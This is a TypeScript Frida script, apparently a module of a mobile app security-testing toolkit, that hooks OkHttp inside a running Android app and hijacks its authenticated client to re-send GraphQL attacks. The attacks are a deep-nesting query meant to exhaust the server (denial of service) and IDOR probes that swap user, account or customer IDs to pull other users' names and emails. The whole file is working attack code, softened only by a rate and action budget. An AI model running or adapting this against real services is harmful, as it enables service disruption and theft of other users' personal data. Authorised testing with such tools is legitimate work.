/*
 * D_054 — GraphQL query fuzzer.
 *
 * Hooks okhttp3.Request.body() for any request whose URL or body
 * contains "graphql" or "query {", captures the live operation
 * envelope, and re-fires two payload families through the same
 * OkHttp client:
 *
 *   1. depth_payload_template — nested-field DoS
 *   2. idor_field_swap        — swap userId/accountId/customerId
 *
 * Records HTTP status + first 400 chars of response.
 */

import { Java } from "../lib/java_ready.js";
import { sendError } from "../lib/send.js";

interface GqlPayload {
    depth_payload_template: string;
    idor_field_swap: string[];
    swap_targets: string[];
    safety_budget?: any;
}
interface GqlResult {
    probes_fired: number;
    interesting_responses: { kind: string; status: number; preview: string }[];
    duration_ms: number;
}

async function graphqlfuzzer(payload: GqlPayload): Promise<GqlResult> {
    const max = Math.min(payload.safety_budget?.max_actions_total ?? 40, 60);
    const window_s = payload.safety_budget?.wall_clock_budget_s ?? 60;
    const rate = payload.safety_budget?.max_actions_per_sec ?? 2;
    const results: any[] = [];
    let captured: any = null;
    let capturedUrl: string | null = null;
    let fired = 0;
    const start = Date.now();

    return new Promise((resolve) => {
        Java.perform(() => {
            try {
                const Client = Java.use("okhttp3.OkHttpClient");
                const RequestBuilder = Java.use("okhttp3.Request$Builder");
                const RequestBody = Java.use("okhttp3.RequestBody");
                const MediaType = Java.use("okhttp3.MediaType");

                Client.newCall.implementation = function (req: any) {
                    const url = String(req.url());
                    if (url.toLowerCase().includes("graphql") && !captured) {
                        captured = this;
                        capturedUrl = url;
                    }
                    return this.newCall(req);
                };

                const ct = MediaType.parse("application/json; charset=utf-8");
                const fire = (body: string, kind: string) => {
                    if (!captured || !capturedUrl) return;
                    const b = RequestBuilder.$new()
                        .url(capturedUrl)
                        .post(RequestBody.create(ct, body));
                    try {
                        const resp = captured.newCall(b.build()).execute();
                        const preview = resp.body()
                            ? String(resp.body().string()).slice(0, 400)
                            : "";
                        results.push({
                            kind, status: resp.code(), preview,
                        });
                        fired++;
                    } catch (_) { /* network failed */ }
                };

                const minInterval = rate > 0 ? 1000 / rate : 0;
                const queue: { body: string; kind: string }[] = [];
                // 1) depth payload
                queue.push({
                    body: JSON.stringify({ query: payload.depth_payload_template }),
                    kind: "depth_dos",
                });
                // 2) IDOR swaps
                for (const field of payload.idor_field_swap) {
                    for (const target of payload.swap_targets) {
                        queue.push({
                            body: JSON.stringify({
                                query: `query { user(${field}: "${target}") { id name email } }`,
                            }),
                            kind: `idor_${field}_${target}`,
                        });
                        if (queue.length >= max) break;
                    }
                }

                let idx = 0;
                const tick = setInterval(() => {
                    if (
                        idx >= queue.length || !captured ||
                        Date.now() - start >= window_s * 1000
                    ) {
                        clearInterval(tick);
                        resolve({
                            probes_fired: fired,
                            interesting_responses: results.slice(0, 30),
                            duration_ms: Date.now() - start,
                        });
                        return;
                    }
                    const it = queue[idx++];
                    fire(it.body, it.kind);
                }, minInterval);
            } catch (e: any) {
                sendError(`D_054: ${e.message}`);
                resolve({
                    probes_fired: 0, interesting_responses: [],
                    duration_ms: 0,
                });
            }
        });
    });
}

rpc.exports = { graphqlfuzzer };
